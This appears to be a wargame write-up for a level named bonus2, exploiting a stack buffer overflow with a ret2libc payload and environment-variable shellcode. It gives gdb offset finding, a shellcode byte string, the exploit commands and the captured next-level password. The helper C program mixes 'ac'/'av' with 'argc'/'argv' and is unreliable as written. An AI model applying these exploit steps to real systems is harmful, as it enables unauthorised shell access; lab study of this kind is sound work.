# bonus2

In this level, the program is not the same if we change the `LANG` env var:
```
export LANG=en_US.UTF-8
export LANG=fi_FI.UTF-8
export LANG=nl_NL.UTF-8
```

If we analyse a little the program, we can see that with the `export LANG=fi_FI.UTF-8`, we can show the EIP at an offset of 18 on the second string

```bash
> export LANG=fi_FI.UTF-8
> gdb bonus2
(gdb) $ run "0123456789012345678901234567890123456789" "AAA~AAA}AAA|AAA{AAAzAAAyAAAxAAAwAAAvAAAuAAAtAAAsAAArAAAqAAApAAAoAAAnAAAmAAAlAAAkAAAjAAAiAAAhAAAgAAAf"
...
(segfault) -> Invalid $PC address: 0x41417a41
EIP: 0x41417a41 ('AzAA') -> offset: 18 (./pattern.py search "AzAA")
```

We can call any function with this feature, let's try to find the `system` function
```bash
> gdb bonus2
(gdb) $ b main
(gdb) $ run
(gdb) $ info function system  # need to call it while runningn
0xb7e6b060  system
```

We can call system with this command
```bash
./bonus2 "`perl -e 'print "A"x40'`" "`perl -e 'print "B"x18 . "\x60\xb0\xe6\xb7"'`"
```
The `call system` is after `ret` of `greetuser` function

Now we know that the first argument of call system is the first argument + 3: `./run AA...A<arg-system>AA...A B*18<system-addr>
The arg is `/bin/sh`, try to find this:
```bash
> gdb bonus2
(gdb) $ b main
(gdb) $ run
(gdb) $ find "/bin/sh"
libc : 0xb7f8cc58 ("/bin/sh")
```

Now we have the argument to send to `system`
```bash
> export LANG=fi_FI.UTF-8
> ./bonus2 "`perl -e 'print "\x58\xcc\xf8\xb7"x10'`" "`perl -e 'print "C"x18 . "\x60\xb0\xe6\xb7"'`"
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

# Alternative with env

```bash
export LANG=fi_FI_US.UTF-8
```

```
r $(perl -e 'print "A"x40') $(perl -e 'print "B"x32')
segfault

pattern create 32
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;A'


r $(perl -e 'print "A"x40') 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;A'
EIP: 0x2d414143 ('CAA-')
EIP+0 found at offset: 18

r $(perl -e 'print "A"x40') $(perl -e 'print "B"x18 . "TADA" . "B"x(32 - 18 - 4)')
```

First, we can add the environnement variable that contains the shellcode.
```bash
export SHELLCODE="`perl -e 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"'`"
```

Let's reuse a c program to get environement var address:
```c
/* gcc -m32 getenv.c -o getenv */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int ac, char *av[]) {
    if(argc < 3) {
        printf("Usage: ./getenv <environment variable> <target name program>\n");
        exit(1);
    }

    char	*ptr = getenv(argv[1]);
    /*
		Le calcul qui suit est nécessaire car le contexte d'exécution peut être différent selon
		l'endroit où l'on se trouve.
		En effet, la variable d'environnement PWD indique le chemin absolu du dossier dans lequel
		on se trouve : la longueur de ce chemin aura un impact sur l'emplacement des variables suivantes
    */
    ptr += strlen(argv[0]) - strlen(argv[2]);

    printf("%s found at %p\n", argv[1], ptr);

    return 0;
}
```

## Exploit

```bash
> ./getenv SHELLCODE ./bonus2
SHELLCODE found at 0xbffff817

> ./bonus2 $(perl -e 'print "A"x40') $(perl -e 'print "B"x18 . "\x17\xf8\xff\xbf" . "B"x(32 - 18 - 4)')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB���BBBBBBBBBB
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```